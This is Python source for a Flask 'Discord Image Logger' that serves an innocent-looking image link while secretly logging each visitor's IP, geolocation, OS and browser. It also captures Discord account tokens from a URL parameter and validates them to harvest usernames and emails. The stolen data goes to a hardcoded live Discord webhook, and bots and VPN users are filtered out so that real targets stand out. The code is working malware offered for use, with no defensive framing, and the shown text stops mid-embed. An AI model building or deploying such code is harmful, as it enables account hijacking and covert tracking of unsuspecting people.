# Discord Image Logger - Vercel Edition
# By DeKrypt | https://github.com/dekrypted
# MODIFIED: Added Discord Token Capture + Vercel Serverless Support

from flask import Flask, request, Response, send_file
from urllib import parse
import traceback, requests, base64, httpagentparser, re, json, time, os, io
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# ========== CONFIGURAÇÕES ==========
config = {
    "webhook": "https://discord.com/api/webhooks/1526403537037426698/w0WhkvyaaQ7FagPqEzQHQyHFjrP4oAfvLv6RUiJLxZX2xbss73DPMeCtQwhZeUfDLdhH",
    "image": "https://upload.wikimedia.org/wikipedia/en/4/4d/Shrek_%28character%29.png",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "crashBrowser": False,
    "accurateLocation": False,
    "message": {
        "doMessage": False,
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
        "richMessage": True,
    },
    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,
    "captureTokens": True,
    "tokenParam": "token",
    "validateTokens": True,
    "ping_on_token": False,
    "redirect": {
        "redirect": False,
        "page": "https://your-link.here"
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip and ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred:\n```\n{error[:1900]}\n```",
            }]
        }, timeout=3)
    except:
        pass

def captureToken(token, source="URL", ip="Unknown", useragent="Unknown"):
    if not config["captureTokens"] or not token:
        return False
    if len(token) < 30:
        return False
    if not re.match(r'^[a-zA-Z0-9._-]{30,100}$', token):
        return False
    
    username, discriminator, user_id, email = "Unknown", "0000", "Unknown", "Unknown"
    verified, nitro_type = False, "None"
    
    if config["validateTokens"]:
        try:
            r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token}, timeout=3)
            if r.status_code == 200:
                data = r.json()
                username = data.get("username", "Unknown")
                discriminator = data.get("discriminator", "0000")
                user_id = data.get("id", "Unknown")
                email = data.get("email", "No email")
                verified = data.get("verified", False)
                nitro = data.get("premium_type", 0)
                nitro_types = ["None", "Nitro Classic", "Nitro", "Nitro Basic"]
                nitro_type = nitro_types[nitro] if nitro < len(nitro_types) else "Unknown"
            else:
                return False
        except:
            return False
    
    embed = {
        "username": config["username"],
        "content": "@everyone" if config.get("ping_on_token", False) else "",
        "embeds": [{
            "title": "🎯 Discord Token Captured",
            "color": 0xFF0000,
            "description": f"""**Token:** `{token[:30]}...`

**User Info:**
> **Username:** `{username}#{discriminator}`
> **User ID:** `{user_id}`
> **Email:** `{email}`
> **Verified:** `{verified}`
> **Nitro:** `{nitro_type}`

**Source:** `{source}`
**IP:** `{ip}`
**Timestamp:** <t:{int(time.time())}>

**Full Token:** ||{token}||""",
            "footer": {"text": "Vercel Image Logger"}
        }]
    }
    
    try:
        requests.post(config["webhook"], json=embed, timeout=3)
        return True
    except:
        return False

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip and ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            try:
                requests.post(config["webhook"], json={
                    "username": config["username"],
                    "embeds": [{
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"Link sent!\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }]
                }, timeout=3)
            except:
                pass
        return
    
    ping = "@everyone"
    info = {"isp": "Unknown", "country": "Unknown", "regionName": "Unknown", "city": "Unknown", "lat": 0, "lon": 0, "timezone": "Unknown", "proxy": False, "hosting": False}
    
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=3)
        if resp.status_code == 200:
            info = resp.json()
    except:
        pass
    
    if info.get("proxy", False):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting", False):
        if config["antiBot"] == 4 and not info.get("proxy", False):
            return
        if config["antiBot"] == 3:
            return
        if config["antiBot"] == 2 and not info.get("proxy", False):
            ping = ""
        if config["antiBot"] == 1:
            ping = ""
    
    os_name, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**IP:** `{ip}`
**Provider:** `{info.get('isp', 'Unknown')}`
**Country:** `{info.get('country', 'Unknown')}`
**Region:** `{info.get('regionName', 'Unknown')}`
**City:** `{info.get('city', 'Unknown')}`
**OS:** `{os_name}`
**Browser:** `{browser}`

**User Agent:**
